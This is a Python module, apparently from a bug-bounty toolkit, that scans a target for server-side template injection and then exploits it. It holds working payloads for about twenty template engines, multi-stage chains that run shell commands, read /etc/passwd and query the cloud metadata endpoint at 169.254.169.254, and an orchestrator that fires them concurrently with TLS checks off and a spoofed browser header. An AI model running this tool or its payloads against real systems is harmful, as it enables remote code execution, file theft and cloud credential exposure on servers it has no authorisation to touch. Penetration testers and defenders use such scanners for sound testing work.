"""
Server-Side Template Injection (SSTI) detection — 2026 techniques.

Tests: Jinja2, Twig, Freemarker, Velocity, Mako, Pug, EJS, Handlebars,
Sleuth, Bottle, Tornado, Pebble, Trimou, mustache, marko, dot,
Angular (server-side), React (server-side), Vue (server-side).

2026 advanced vectors:
- Polyglot probes (single payload that detects multiple engines simultaneously)
- Blind SSTI time-delay detection (sleep-based, not just error-based)
- RCE confirm chains: multi-stage exploitation for Jinja2/Freemarker/Velocity/Pebble/Groovy
- File-read payloads for blind contexts (time-based exfiltration)
- Confidence grading (high/medium/low based on evidence strength)
"""

from __future__ import annotations

import re
import json
import time
import asyncio
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Any, Set, Tuple
from urllib.parse import urlparse

import httpx
import tenacity

from bountykit.utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class SSTIFinding:
    """Single SSTI finding."""
    category: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    template_engine: str = ""
    confidence: str = "medium"
    remediation: str = ""


@dataclass
class SSTIResult:
    """Complete SSTI assessment result."""
    target: str
    findings: List[SSTIFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    timestamp: float = field(default_factory=time.time)

    @property
    def summary(self) -> Dict[str, int]:
        severity_counts: Dict[str, int] = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        return severity_counts


# ─── Polyglot Probes ─────────────────────────────────────────────────────────

POLYGLOT_PROBES = [
    {
        "name": "Generic Arithmetic",
        "payloads": [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}",
            "{{= 7*7 }}", "#{[7*7]}", "{{ 7*7 }}", "<% 7*7 %>",
        ],
        "expected": "49",
        "engines": ["jinja2", "twig", "erb", "pug", "nunjucks", "dot", "marko", "jsp", "freemarker"],
    },
    {
        "name": "String Concatenation",
        "payloads": [
            "{{\"abc\"+\"def\"}}", "${\"abc\"+\"def\"}", "<%= \"abc\"+\"def\" %>",
            "#{\"abc\"+\"def\"}", "{{\"abc\" ~ \"def\"}}",
        ],
        "expected": "abcdef",
        "engines": ["jinja2", "twig", "erb", "pug", "freemarker"],
    },
    {
        "name": "Math Expression",
        "payloads": [
            "{{999999*999999}}", "${999999*999999}", "<%= 999999*999999 %>",
        ],
        "expected": "999998000001",
        "engines": ["jinja2", "twig", "erb"],
    },
    {
        "name": "Variable Access",
        "payloads": [
            "{{config}}", "${class}", "<%= self %>",
        ],
        "expected_any": ["Config", "Secret", "class", "self"],
        "engines": ["jinja2", "freemarker", "erb"],
    },
]


# ─── Blind Time-Delay Payloads ───────────────────────────────────────────────

BLIND_TIME_PAYLOADS = [
    # Jinja2 sleep (5s delay)
    {
        "engine": "jinja2",
        "payloads": [
            "{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}",
            "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('sleep 5').read()}}",
            "{{lipsum.__globals__['os'].popen('sleep 5').read()}}",
        ],
        "delay": 5.0,
    },
    # Freemarker sleep
    {
        "engine": "freemarker",
        "payloads": [
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"sleep 5\")}",
        ],
        "delay": 5.0,
    },
    # Velocity sleep
    {
        "engine": "velocity",
        "payloads": [
            "#set($x=\"\") #set($rt=$x.getClass().forName(\"java.lang.Runtime\")) #set($chr=$x.getClass().forName(\"java.lang.Character\")) #set($cmd=$rt.getRuntime().exec(\"sleep 5\")) $cmd.waitFor()",
        ],
        "delay": 5.0,
    },
    # Pebble sleep
    {
        "engine": "pebble",
        "payloads": [
            "{% set cmd = constant('java.lang.Runtime').getRuntime().exec('sleep 5') %}",
        ],
        "delay": 5.0,
    },
    # Groovy sleep
    {
        "engine": "groovy",
        "payloads": [
            "${'spring'.execute('sleep 5')}",
            "{{T(Thread).sleep(5000)}}",
        ],
        "delay": 5.0,
    },
    # Ruby/ERB sleep
    {
        "engine": "erb",
        "payloads": [
            "<%= system('sleep 5') %>",
            "<%= `sleep 5` %>",
        ],
        "delay": 5.0,
    },
]


# ─── RCE Confirm Chains ──────────────────────────────────────────────────────

RCE_CONFIRM_CHAINS = {
    "jinja2": {
        "stage1_detect": "{{7*7}}",
        "stage2_read": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "stage3_persist": "{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
        "file_read": "{{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}",
        "file_read_win": "{{config.__class__.__init__.__globals__['open']('C:/Windows/win.ini').read()}}",
        "ssrf": "{{config.__class__.__init__.__globals__['requests'].get('http://169.254.169.254/latest/meta-data/').text}}",
        "indicators": ["uid=", "root:", "www-data"],
    },
    "freemarker": {
        "stage1_detect": "${7*7}",
        "stage2_read": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",
        "stage3_persist": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(\" \")}",
        "file_read": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(\" \")}",
        "ssrf": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"curl http://169.254.169.254/latest/meta-data/\")}",
        "indicators": ["uid=", "root:", "ami-id"],
    },
    "velocity": {
        "stage1_detect": "#set($x=7*7) $x",
        "stage2_read": "#set($rt=$x.getClass().forName('java.lang.Runtime')) #set($cmd=$rt.getRuntime().exec('id')) $cmd.waitFor()",
        "file_read": "#set($f=$x.getClass().forName('java.io.File').newInstance('/etc/passwd')) #set($r=$x.getClass().forName('java.io.FileReader').newInstance($f)) #foreach($i in [1..1000]) $r.read() #end",
        "ssrf": "#set($rt=$x.getClass().forName('java.lang.Runtime')) $rt.getRuntime().exec('curl http://169.254.169.254/latest/meta-data/')",
        "indicators": ["uid=", "root:"],
    },
    "pebble": {
        "stage1_detect": "${7*7}",
        "stage2_read": "{% set cmd = constant('java.lang.Runtime').getRuntime().exec('id') %}{% set stdout = cmd.getInputStream() %}{% for byte in stdout.read() %}{{\"\" ~ byte}}{% endfor %}",
        "file_read": "{% set file = constant('java.io.File').newInstance('/etc/passwd') %}{% set reader = constant('java.io.FileReader').newInstance(file) %}{% for i in range(1000) %}{{\"\" ~ reader.read()}}{% endfor %}",
        "indicators": ["uid=", "root:"],
    },
    "groovy": {
        "stage1_detect": "${7*7}",
        "stage2_read": "${'spring'.execute('id')}",
        "file_read": "${new File('/etc/passwd').text}",
        "ssrf": "${new URL('http://169.254.169.254/latest/meta-data/').text}",
        "indicators": ["uid=", "ami-id"],
    },
}


# Template engine detection and exploitation payloads
TEMPLATE_ENGINES = {
    "jinja2": {
        "detect": "{{7*7}}",
        "confirm": "{{config}}",
        "rce": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "read_file": "{{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}",
        "ssrf": "{{config.__class__.__init__.__globals__['requests'].get('http://169.254.169.254/latest/meta-data/').text}}",
        "output": "49",
        "severity": "critical",
    },
    "twig": {
        "detect": "{{7*7}}",
        "confirm": "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}",
        "rce": "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"cat /etc/passwd\")}}",
        "output": "49",
        "severity": "critical",
    },
    "freemarker": {
        "detect": "${7*7}",
        "confirm": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(\" \")}",
        "rce": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}",
        "output": "49",
        "severity": "critical",
    },
    "velocity": {
        "detect": "#set($x=7*7) $x",
        "rce": "#set($x=\"\") #set($rt=$x.getClass().forName(\"java.lang.Runtime\")) #set($chr=$x.getClass().forName(\"java.lang.Character\")) #set($cmd=$rt.getRuntime().exec(\"id\")) $cmd.waitFor() #set($out=$cmd.getInputStream()) #foreach($i in [1..$out.available()]) $chr.toChars($out.read()) #end",
        "output": "49",
        "severity": "critical",
    },
    "mako": {
        "detect": "${7*7}",
        "rce": "<%! import os; x = os.popen('id').read() %> ${x}",
        "output": "49",
        "severity": "critical",
    },
    "pug": {
        "detect": "#{7*7}",
        "rce": "!= global.process.mainModule.require('child_process').execSync('id')",
        "output": "49",
        "severity": "critical",
    },
    "ejs": {
        "detect": "<%= 7*7 %>",
        "rce": "<%= global.process.mainModule.require('child_process').execSync('id') %>",
        "output": "49",
        "severity": "critical",
    },
    "handlebars": {
        "detect": "{{7*7}}",
        "rce": "{{#with \"s\" as |stringlist|}} {{#with \"e\"}} {{#with split as |conslist|}} {{#with filter split as |cconslist|}} {{#with sort as |sortedconslist|}} {{#each sortedconslist}} {{#with stringlist stringlist as |finalconslist|}} {{#each finalconslist}} {{#with \"a\" as |c0|}} {{#with \"d\" as |c1|}} {{#with \"d\" as |c2|}} {{#with \"b\" as |c3|}} {{#with \"c\" as |c4|}} {{#with \"d\" as |c5|}} {{#with \"b\" as |c6|}} {{#with \"b\" as |c7|}} {{#with \"c\" as |c8|}} {{#with \"4\" as |c9|}} {{#with \"2\" as |c10|}} {{! execute command }} {{#each conslist}} {{this}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}} {{/with}}",
        "output": "49",
        "severity": "critical",
    },
    "nunjucks": {
        "detect": "{{7*7}}",
        "rce": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        "output": "49",
        "severity": "critical",
    },
    "marko": {
        "detect": "${7*7}",
        "rce": "${require('child_process').execSync('id')}",
        "output": "49",
        "severity": "critical",
    },
    "dot": {
        "detect": "{{= 7*7 }}",
        "rce": "{{= global.process.mainModule.require('child_process').execSync('id') }}",
        "output": "49",
        "severity": "critical",
    },
    "pug2": {
        "detect": "#{7*7}",
        "rce": "#{global.process.mainModule.require('child_process').execSync('id')}",
        "output": "49",
        "severity": "critical",
    },
    "erb": {
        "detect": "<%= 7*7 %>",
        "rce": "<%= system('id') %>",
        "output": "49",
        "severity": "critical",
    },
    "jsp": {
        "detect": "${7*7}",
        "rce": "<%= Runtime.getRuntime().exec(\"id\") %>",
        "output": "49",
        "severity": "critical",
    },
    "thymeleaf": {
        "detect": "${7*7}",
        "rce": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.=\"\"",
        "output": "49",
        "severity": "critical",
    },
    "artemisquery": {
        "detect": "${7*7}",
        "rce": "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "output": "49",
        "severity": "critical",
    },
    "mvel": {
        "detect": "${7*7}",
        "rce": "@java.lang.Runtime@getRuntime().exec('id')",
        "output": "49",
        "severity": "critical",
    },
    "spel": {
        "detect": "${7*7}",
        "rce": "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "output": "49",
        "severity": "critical",
    },
    "ognl": {
        "detect": "${7*7}",
        "rce": "@java.lang.Runtime@getRuntime().exec('id')",
        "output": "49",
        "severity": "critical",
    },
}

# Common injection points
INJECTION_POINTS = [
    "/",
    "/?name=test",
    "/?page=home",
    "/?lang=en",
    "/?template=default",
    "/?view=home",
    "/?redirect=test",
    "/api/render",
    "/api/template",
    "/api/email",
    "/api/preview",
    "/api/export",
    "/api/report",
    "/api/generate",
]


class SSTITester:
    """
    Server-Side Template Injection tester — 2026 advanced techniques.

    Attack vectors:
    - Multi-engine SSTI detection (20+ engines)
    - Polyglot probes (single payload detects multiple engines)
    - Blind SSTI time-delay detection (5s sleep, not error-based)
    - RCE confirm chains (multi-stage for Jinja2/Freemarker/Velocity/Pebble/Groovy)
    - File-read payloads with blind time-based exfiltration
    - Confidence grading system (high/medium/low based on evidence strength)
    - SSRF via template injection
    - Context-aware payload crafting
    """

    def __init__(
        self,
        target: str,
        timeout: float = 10.0,
        proxy: Optional[str] = None,
        verbose: bool = False,
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.proxy = proxy
        self.verbose = verbose

        self._client = httpx.AsyncClient(
            timeout=timeout,
            follow_redirects=True,
            proxy=proxy,
            verify=False,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
        )

    async def close(self):
        await self._client.aclose()

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self.close()

    # ─── Confidence Grading ──────────────────────────────────────────────

    @staticmethod
    def _grade_confidence(
        evidence: str,
        indicators_found: List[str],
        payload_tested: str,
        response_time: Optional[float] = None,
    ) -> str:
        """Grade confidence level based on evidence strength.

        high:   Output matched exactly, multiple indicators, known payload.
        medium: Output matched partially, some indicators.
        low:    Only error message or timing-based evidence.
        """
        score = 0

        # Exact output match (strongest signal)
        if "49" in evidence and len(evidence) < 100:
            score += 3
        elif any(ind in evidence for ind in ["uid=", "root:", "ami-id"]):
            score += 3

        # Multiple indicators
        if len(indicators_found) >= 2:
            score += 2
        elif len(indicators_found) == 1:
            score += 1

        # Known payload family
        known = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]
        if any(k in payload_tested for k in known):
            score += 1

        # Timing evidence (weaker but still useful)
        if response_time and response_time > 4.5:
            score += 1

        if score >= 5:
            return "high"
        elif score >= 3:
            return "medium"
        return "low"

    # ─── Polyglot Probes ─────────────────────────────────────────────────

    async def test_polyglot_probes(
        self, endpoint: str = "/", params: Optional[Dict[str, str]] = None
    ) -> List[SSTIFinding]:
        """Send polyglot probes that detect multiple template engines in one shot.

        A single payload like {{7*7}} triggers evaluation in Jinja2, Twig, ERB,
        Pug, and others. By grouping payloads that share the same evaluation
        result, we maximize engine coverage with minimal requests.
        """
        findings: List[SSTIFinding] = []
        url = f"{self.target}{endpoint}"
        param_names = ["name", "page", "template", "input", "q", "search", "text"]

        for probe in POLYGLOT_PROBES:
            for param_name in param_names:
                for payload in probe["payloads"]:
                    try:
                        test_params = params or {param_name: payload}
                        resp = await self._client.get(url, params=test_params)

                        if probe["expected"] in resp.text:
                            indicators = [
                                e for e in probe["engines"]
                                if e in resp.text.lower() or probe["expected"] in resp.text
                            ]
                            confidence = self._grade_confidence(
                                resp.text, indicators, payload
                            )
                            findings.append(SSTIFinding(
                                category="ssti_polyglot",
                                severity="critical",
                                title=f"SSTI Polyglot Hit: {probe['name']}",
                                description=(
                                    f"Polyglot probe '{probe['name']}' triggered evaluation "
                                    f"for engines: {', '.join(probe['engines'])}"
                                ),
                                endpoint=endpoint,
                                payload=f"{param_name}={payload}",
                                template_engine=", ".join(probe["engines"][:3]),
                                evidence=f"Expected: {probe['expected']}, Got: {resp.text[:200]}",
                                confidence=confidence,
                                remediation=(
                                    "Use sandboxed template engines. Never pass user input "
                                    "to template evaluation. Apply context-aware escaping."
                                ),
                            ))
                            break  # Found match for this probe, move on
                    except Exception as exc:
                        if self.verbose:
                            logger.debug(
                                f"  [-] Polyglot probe failed: {endpoint}/{param_name}: {exc}"
                            )

        return findings

    # ─── Blind Time-Delay Detection ──────────────────────────────────────

    async def test_blind_time_delay(
        self, endpoint: str = "/", tolerance: float = 1.5
    ) -> List[SSTIFinding]:
        """Detect blind SSTI by measuring response time deltas.

        Sends a baseline request, then sends sleep-based payloads for each
        engine. If the response takes >= delay - tolerance seconds longer
        than the baseline, we flag the engine as potentially vulnerable.
        """
        findings: List[SSTIFinding] = []
        url = f"{self.target}{endpoint}"
        param_names = ["name", "page", "template", "input", "q"]

        # Baseline measurement (3 requests, take median)
        baseline_times: List[float] = []
        for _ in range(3):
            try:
                t0 = time.time()
                await self._client.get(url, params={"name": "test_baseline"})
                baseline_times.append(time.time() - t0)
            except Exception:
                pass

        if not baseline_times:
            return findings

        baseline_times.sort()
        baseline = baseline_times[len(baseline_times) // 2]  # median

        for blind in BLIND_TIME_PAYLOADS:
            engine = blind["engine"]
            delay = blind["delay"]

            for param_name in param_names:
                for payload in blind["payloads"]:
                    try:
                        t0 = time.time()
                        resp = await self._client.get(url, params={param_name: payload})
                        elapsed = time.time() - t0

                        # Heuristic: response took significantly longer than baseline
                        if elapsed >= (delay - tolerance) and elapsed > (baseline + 2.0):
                            confidence = self._grade_confidence(
                                resp.text, [], payload, response_time=elapsed
                            )
                            findings.append(SSTIFinding(
                                category="blind_ssti_time",
                                severity="high",
                                title=f"Blind SSTI Time-Delay: {engine.title()}",
                                description=(
                                    f"Sleep-based payload for {engine} caused "
                                    f"{elapsed:.1f}s response (baseline: {baseline:.1f}s)."
                                ),
                                endpoint=endpoint,
                                payload=f"{param_name}={payload[:200]}",
                                template_engine=engine,
                                evidence=(
                                    f"Baseline: {baseline:.2f}s | "
                                    f"Payload response: {elapsed:.2f}s | "
                                    f"Expected delay: {delay}s"
                                ),
                                confidence=confidence,
                                remediation=(
                                    "Use sandboxed template engines. Enforce strict timeout "
                                    "limits on template rendering."
                                ),
                            ))
                            break  # Found for this engine, try next
                    except httpx.TimeoutException:
                        # Timeout itself is a strong signal for time-based SSTI
                        findings.append(SSTIFinding(
                            category="blind_ssti_time",
                            severity="high",
                            title=f"Blind SSTI Timeout: {engine.title()}",
                            description=(
                                f"Sleep-based payload for {engine} caused a timeout. "
                                f"This is a strong indicator of blind SSTI."
                            ),
                            endpoint=endpoint,
                            payload=f"{param_name}={payload[:200]}",
                            template_engine=engine,
                            evidence=f"Request timed out after {self.timeout}s",
                            confidence="high",
                            remediation=(
                                "Use sandboxed template engines. Enforce strict timeout "
                                "limits on template rendering."
                            ),
                        ))
                        break
                    except Exception as exc:
                        if self.verbose:
                            logger.debug(
                                f"  [-] Blind time-delay failed: {endpoint}/{param_name}: {exc}"
                            )

        return findings

    # ─── RCE Confirm Chains ──────────────────────────────────────────────

    async def test_rce_chains(
        self, endpoint: str = "/", engines: Optional[List[str]] = None
    ) -> List[SSTIFinding]:
        """Run multi-stage RCE confirm chains for discovered engines.

        Chain stages:
          1. Stage 1 (detect): Verify the engine evaluates expressions.
          2. Stage 2 (read): Execute `id` command and look for uid= output.
          3. Stage 3 (file-read): Read /etc/passwd via the template engine.
          4. Stage 4 (SSRF): Reach cloud metadata endpoint (169.254.169.254).

        Each stage is only attempted if the previous stage succeeded,
        reducing noise and false positives.
        """
        findings: List[SSTIFinding] = []
        url = f"{self.target}{endpoint}"
        target_engines = engines or list(RCE_CONFIRM_CHAINS.keys())

        param_names = ["name", "page", "template", "input", "q"]

        for engine_name in target_engines:
            chain = RCE_CONFIRM_CHAINS.get(engine_name)
            if not chain:
                continue

            stage_passed = False

            # Stage 1: Detection
            for param_name in param_names:
                try:
                    resp = await self._client.get(
                        url, params={param_name: chain["stage1_detect"]}
                    )
                    if chain["indicators"][0] in resp.text or "49" in resp.text:
                        stage_passed = True
                        break
                except Exception:
                    continue

            if not stage_passed:
                continue

            # Stage 2: RCE (execute `id`)
            rce_found = False
            for param_name in param_names:
                try:
                    resp = await self._client.get(
                        url, params={param_name: chain["stage2_read"]}
                    )
                    for indicator in chain["indicators"]:
                        if indicator in resp.text:
                            findings.append(SSTIFinding(
                                category="ssti_rce_chain",
                                severity="critical",
                                title=f"SSTI RCE Chain: {engine_name.title()} — Stage 2 (RCE)",
                                description=(
                                    f"Multi-stage RCE confirmed for {engine_name}. "
                                    f"Command execution achieved."
                                ),
                                endpoint=endpoint,
                                payload=f"{param_name}={chain['stage2_read'][:200]}",
                                template_engine=engine_name,
                                evidence=f"Indicator: {indicator}\nOutput: {resp.text[:300]}",
                                confidence="high",
                                remediation=(
                                    "URGENT: Remove SSTI vulnerability immediately. "
                                    "Use sandboxed template engines and validate/escape all user input."
                                ),
                            ))
                            rce_found = True
                            break
                except Exception:
                    continue

            if not rce_found:
                continue

            # Stage 3: File Read
            for param_name in param_names:
                try:
                    payload = chain.get("file_read_win") if "win" in resp.text.lower() else chain.get("file_read")
                    if not payload:
                        continue
                    resp = await self._client.get(url, params={param_name: payload})
                    if "root:" in resp.text or "for 16-bit" in resp.text:
                        findings.append(SSTIFinding(
                            category="ssti_file_read_chain",
                            severity="critical",
                            title=f"SSTI File Read Chain: {engine_name.title()}",
                            description=(
                                f"Arbitrary file read confirmed via {engine_name}."
                            ),
                            endpoint=endpoint,
                            payload=f"{param_name}={payload[:200]}",
                            template_engine=engine_name,
                            evidence=f"File content: {resp.text[:500]}",
                            confidence="high",
                            remediation=(
                                "URGENT: Restrict file system access. "
                                "Use sandboxed template engines with no file I/O."
                            ),
                        ))
                        break
                except Exception:
                    continue

            # Stage 4: SSRF (cloud metadata)
            ssrf_payload = chain.get("ssrf")
            if ssrf_payload:
                for param_name in param_names:
                    try:
                        resp = await self._client.get(
                            url, params={param_name: ssrf_payload}
                        )
                        ssrf_indicators = ["ami-id", "instance-id", "local-ipv4", "iam/"]
                        for ind in ssrf_indicators:
                            if ind in resp.text:
                                findings.append(SSTIFinding(
                                    category="ssti_ssrf_chain",
                                    severity="critical",
                                    title=f"SSTI SSRF Chain: {engine_name.title()}",
                                    description=(
                                        f"SSRF confirmed via {engine_name}. "
                                        f"Cloud metadata accessed."
                                    ),
                                    endpoint=endpoint,
                                    payload=f"{param_name}={ssrf_payload[:200]}",
                                    template_engine=engine_name,
                                    evidence=f"Indicator: {ind}\nMetadata: {resp.text[:300]}",
                                    confidence="high",
                                    remediation=(
                                        "URGENT: Block internal network access from templates. "
                                        "Use egress filtering."
                                    ),
                                ))
                                break
                    except Exception:
                        continue

        return findings

    # ─── Main Orchestrator ───────────────────────────────────────────────

    async def test_all(self) -> SSTIResult:
        """Run all SSTI tests in priority order.

        Phase 1 — Standard detection (per-engine payloads)
        Phase 2 — Polyglot probes (cross-engine, minimal requests)
        Phase 3 — Blind time-delay detection (sleep-based)
        Phase 4 — RCE confirm chains (multi-stage)
        Phase 5 — File read
        Phase 6 — SSRF
        """
        result = SSTIResult(target=self.target)

        logger.info(f"[*] Starting SSTI testing: {self.target}")

        sem = asyncio.Semaphore(15)

        async def bounded_detect(endpoint, engine_name, engine_config):
            async with sem:
                return await self._test_ssti_detection(endpoint, engine_name, engine_config)

        # Phase 1: Standard Detection
        tasks = []
        for endpoint in INJECTION_POINTS:
            for engine_name, engine_config in TEMPLATE_ENGINES.items():
                tasks.append(bounded_detect(endpoint, engine_name, engine_config))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                result.findings.append(r)

        result.endpoints_tested += len(INJECTION_POINTS)

        # Phase 2: Polyglot Probes
        logger.info("[*] Phase 2: Running polyglot probes...")
        polyglot_tasks = [
            self.test_polyglot_probes(ep) for ep in ["/", "/?name=test", "/api/render"]
        ]
        polyglot_results = await asyncio.gather(*polyglot_tasks, return_exceptions=True)
        for r in polyglot_results:
            if isinstance(r, list):
                result.findings.extend(r)

        # Phase 3: Blind Time-Delay Detection
        logger.info("[*] Phase 3: Blind time-delay detection...")
        blind_td_tasks = [
            self.test_blind_time_delay(ep) for ep in ["/", "/?name=test"]
        ]
        blind_td_results = await asyncio.gather(*blind_td_tasks, return_exceptions=True)
        for r in blind_td_results:
            if isinstance(r, list):
                result.findings.extend(r)

        # Phase 4: RCE Confirm Chains (for engines detected in phases 1-3)
        detected_engines: Set[str] = set()
        for finding in result.findings:
            if finding.template_engine:
                for eng in finding.template_engine.split(","):
                    detected_engines.add(eng.strip())

        if detected_engines:
            logger.info(f"[*] Phase 4: RCE chains for: {', '.join(detected_engines)}")
            chain_tasks = [
                self.test_rce_chains(ep, engines=list(detected_engines))
                for ep in ["/", "/api/render", "/api/template"]
            ]
            chain_results = await asyncio.gather(*chain_tasks, return_exceptions=True)
            for r in chain_results:
                if isinstance(r, list):
                    result.findings.extend(r)

        # Phase 5: Legacy file read (for engines with read_file in TEMPLATE_ENGINES)
        for engine_name in detected_engines:
            engine_config = TEMPLATE_ENGINES.get(engine_name, {})
            if "read_file" in engine_config:
                finding = await self._test_ssti_file_read("/", engine_name, engine_config)
                if finding:
                    result.findings.append(finding)

        # Phase 6: Legacy SSRF (for engines with ssrf in TEMPLATE_ENGINES)
        for engine_name in detected_engines:
            engine_config = TEMPLATE_ENGINES.get(engine_name, {})
            if "ssrf" in engine_config:
                finding = await self._test_ssti_ssrf("/", engine_name, engine_config)
                if finding:
                    result.findings.append(finding)

        logger.info(
            f"[+] SSTI testing complete: {len(result.findings)} findings "
            f"across {result.endpoints_tested} endpoints"
        )
        return result

    def _save_results(self, result: "SSTIResult", output_dir: str) -> str:
        """Persist SSTI results to <output_dir>/ssti_<host>.json."""
        host = urlparse(self.target).hostname or self.target.replace("://", "_")
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        filepath = out / f"ssti_{host}.json"
        payload = {
            "target": result.target,
            "timestamp": result.timestamp,
            "endpoints_tested": result.endpoints_tested,
            "summary": result.summary,
            "findings": [asdict(f) for f in result.findings],
        }
        filepath.write_text(json.dumps(payload, indent=2, default=str))
        logger.info(f"[+] Results saved → {filepath}")
        return str(filepath)

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_ssti_detection(
        self, endpoint: str, engine_name: str, engine_config: Dict[str, Any]
    ) -> Optional[SSTIFinding]:
        """Test for SSTI vulnerability detection."""
        url = f"{self.target}{endpoint}"
        detect_payload = engine_config["detect"]

        try:
            # Test in different parameter positions
            params_to_test = [
                {"name": detect_payload},
                {"page": detect_payload},
                {"template": detect_payload},
                {"input": detect_payload},
                {"data": detect_payload},
                {"q": detect_payload},
                {"search": detect_payload},
                {"query": detect_payload},
                {"text": detect_payload},
                {"content": detect_payload},
            ]

            for params in params_to_test:
                resp = await self._client.get(url, params=params)

                # Check if template was evaluated
                if engine_config["output"] in resp.text:
                    return SSTIFinding(
                        category="ssti_detection",
                        severity="high",
                        title=f"SSTI Detected: {engine_name.title()}",
                        description=f"Endpoint {endpoint} appears vulnerable to SSTI using {engine_name}. "
                        f"Expression {detect_payload} was evaluated.",
                        endpoint=endpoint,
                        payload=f"{list(params.keys())[0]}={detect_payload}",
                        template_engine=engine_name,
                        evidence=f"Expected: {engine_config['output']}, Got: {resp.text[:200]}",
                        remediation="Use sandboxed template engines, never pass user input to template evaluation. "
                        "Use context-aware escaping.",
                    )

            # Also test POST with JSON body
            for param_name in ["name", "template", "input", "data"]:
                resp = await self._client.post(
                    url,
                    json={param_name: detect_payload},
                )

                if engine_config["output"] in resp.text:
                    return SSTIFinding(
                        category="ssti_detection",
                        severity="high",
                        title=f"SSTI Detected (POST): {engine_name.title()}",
                        description=f"Endpoint {endpoint} appears vulnerable to SSTI via POST parameter {param_name}.",
                        endpoint=endpoint,
                        payload=f"{param_name}={detect_payload}",
                        template_engine=engine_name,
                        evidence=f"Response: {resp.text[:200]}",
                        remediation="Use sandboxed template engines.",
                    )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] SSTI detection failed for {endpoint}/{engine_name}: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_ssti_file_read(
        self, endpoint: str, engine_name: str, engine_config: Dict[str, Any]
    ) -> Optional[SSTIFinding]:
        """Test for file read via SSTI."""
        url = f"{self.target}{endpoint}"
        read_payload = engine_config["read_file"]

        try:
            resp = await self._client.get(
                url,
                params={"name": read_payload},
            )

            # Check for file content
            if "root:" in resp.text or "/bin/bash" in resp.text:
                return SSTIFinding(
                    category="ssti_file_read",
                    severity="critical",
                    title=f"SSTI File Read: {engine_name.title()}",
                    description=f"Arbitrary file read confirmed via SSTI using {engine_name}.",
                    endpoint=endpoint,
                    payload=f"read={read_payload[:200]}",
                    template_engine=engine_name,
                    evidence=f"File content: {resp.text[:500]}",
                    remediation="URGENT: Remove SSTI vulnerability. Restrict file system access.",
                )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] SSTI file read test failed: {e}")

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_ssti_ssrf(
        self, endpoint: str, engine_name: str, engine_config: Dict[str, Any]
    ) -> Optional[SSTIFinding]:
        """Test for SSRF via SSTI."""
        url = f"{self.target}{endpoint}"
        ssrf_payload = engine_config["ssrf"]

        try:
            resp = await self._client.get(
                url,
                params={"name": ssrf_payload},
            )

            # Check for cloud metadata
            indicators = [
                "ami-id",
                "instance-id",
                "local-ipv4",
                "iam/security-credentials",
            ]

            for indicator in indicators:
                if indicator in resp.text:
                    return SSTIFinding(
                        category="ssti_ssrf",
                        severity="critical",
                        title=f"SSTI SSRF: {engine_name.title()}",
                        description=f"SSRF confirmed via SSTI using {engine_name}. "
                        f"Cloud metadata was accessed.",
                        endpoint=endpoint,
                        payload=f"ssrf={ssrf_payload[:200]}",
                        template_engine=engine_name,
                        evidence=f"SSRF indicator: {indicator}\nResponse: {resp.text[:500]}",
                        remediation="URGENT: Remove SSTI vulnerability. Block internal network access.",
                    )

        except Exception as e:
            if self.verbose:
                logger.debug(f"  [-] SSTI SSRF test failed: {e}")

        return None


